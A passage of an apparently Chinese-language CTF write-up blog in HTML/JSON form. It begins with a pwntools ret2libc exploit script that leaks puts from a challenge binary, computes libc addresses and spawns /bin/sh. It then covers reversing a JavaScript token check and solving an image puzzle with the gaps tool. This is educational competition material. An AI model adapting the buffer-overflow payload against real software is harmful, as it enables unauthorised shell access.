class=\"line\">elf=ELF(<span class=\"string\">&quot;/home/feichai/ctf_file/choice&quot;</span>)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&quot;/home/feichai/ctf_file/libc-2.23.so&quot;</span>)</span><br><span class=\"line\">puts_got = elf.got.puts</span><br><span class=\"line\">puts_plt = elf.plt.puts</span><br><span class=\"line\">ret_addr = <span class=\"number\">0x080483c2</span></span><br><span class=\"line\">return_addr = <span class=\"number\">0x0804857B</span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;Please enter your name:&quot;</span>)</span><br><span class=\"line\">p.send(<span class=\"string\">b&#x27;\\x00&#x27;</span> + <span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">19</span> + <span class=\"string\">b&#x27;\\xff&#x27;</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;3. Study hard from now&quot;</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b&#x27;1&#x27;</span>)</span><br><span class=\"line\">pad = <span class=\"string\">b&#x27;a&#x27;</span> * (<span class=\"number\">28</span> + <span class=\"number\">4</span>) + p32(elf.plt[<span class=\"string\">b&#x27;puts&#x27;</span>]) +p32(return_addr) +p32(elf.got[<span class=\"string\">b&#x27;puts&#x27;</span>])</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">&quot;Wrong choice!&quot;</span>)</span><br><span class=\"line\">p.sendline(pad)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b&quot;Good bye!&quot;</span>)</span><br><span class=\"line\">puts_addr = u32(p.recv()[<span class=\"number\">1</span>:<span class=\"number\">5</span>])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(puts_addr))</span><br><span class=\"line\">libc_base = puts_addr - libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">sys_addr = libc_base + libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\">bin_sh = libc_base + <span class=\"built_in\">next</span>(libc.search(<span class=\"string\">b&quot;/bin/sh\\x00&quot;</span>))</span><br><span class=\"line\">payload = <span class=\"string\">b&#x27;a&#x27;</span>*(<span class=\"number\">28</span>+<span class=\"number\">4</span>) + p32(ret_addr) +p32(sys_addr) +p32(<span class=\"number\">0xdeadbeef</span>) +p32(bin_sh)</span><br><span class=\"line\">p.send(payload)</span><br><span class=\"line\">p.interactive() </span><br></pre></td></tr></table></figure></p>\n<h4 id=\"i-have-the-flag\"><a class=\"anchor\" href=\"#i-have-the-flag\">#</a> I have the Flag</h4>\n<p>下载下来后一个 html 一个 js</p>\n<p><img data-src=\"/pic/clip_image002.jpg\" alt=\"\" /></p>\n<p>输一个 Something 正确就可以得到 flag</p>\n<p><img data-src=\"G:%5Cblog%5Csource_posts%5Cgjswp-md%5Cclip_image004.jpg\" alt=\"img\" /></p>\n<p>查看 js 发现 Something 就是 Token，Token 经过了三次加密</p>\n<p><img data-src=\"/pic/clip_image006.jpg\" alt=\"\" /></p>\n<p>分析 ck (s) 函数：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function ck(s) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  try &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    ic</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125; catch (e) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    return;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];</span><br><span class=\"line\"></span><br><span class=\"line\">  if (s.length == a.length) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    for (i = 0; i &lt; s.length; i++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​      if (a[i] - s.charCodeAt(i) != 3)</span><br><span class=\"line\"></span><br><span class=\"line\">​        return ic = false;</span><br><span class=\"line\"></span><br><span class=\"line\">​    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">​    return ic = true;</span><br><span class=\"line\"></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  return ic = false;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>就是把输入的字符串的字符的 ASCII 码和 a [] 数组中的数逐个比较，一旦出现不是相差 3 的字符就返回<br />\n return ic = false;<br />\n 所有的字符和数字都相差 3 时就返回<br />\n return ic = true;<br />\n 我们根据代码逻辑，写出逆向求输入字符串的代码：</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">var a = [118, 108, 112, 115, 111, 104, 104, 103, 120, 52, 53, 54];</span><br><span class=\"line\"></span><br><span class=\"line\">var s=&quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">for (i = 0; i &lt; a.length; i++) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">​    s += String.fromCharCode(a[i] - 3);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>控制台运行</p>\n<p><img data-src=\"/pic/clip_image008.jpg\" alt=\"\" /></p>\n<h6 id=\"数独\"><a class=\"anchor\" href=\"#数独\">#</a> 数独</h6>\n<p>数独我做不来，就想到了拼接图片</p>\n<p><img data-src=\"/pic/clip_image010.jpg\" alt=\"\" /></p>\n<p>使用命令 gaps --image=image.png --generations=55 --population=9 --size=70 把 flag 拼好就可以了，感觉是一个非预期解</p>\n<p><img data-src=\"/pic/clip_image012.png\" alt=\"\" /></p>\n<p 4e4d6c332d6fe62a63afee56171fd3725=\"\">flag</p>\n",
            "tags": []
        }
    ]
}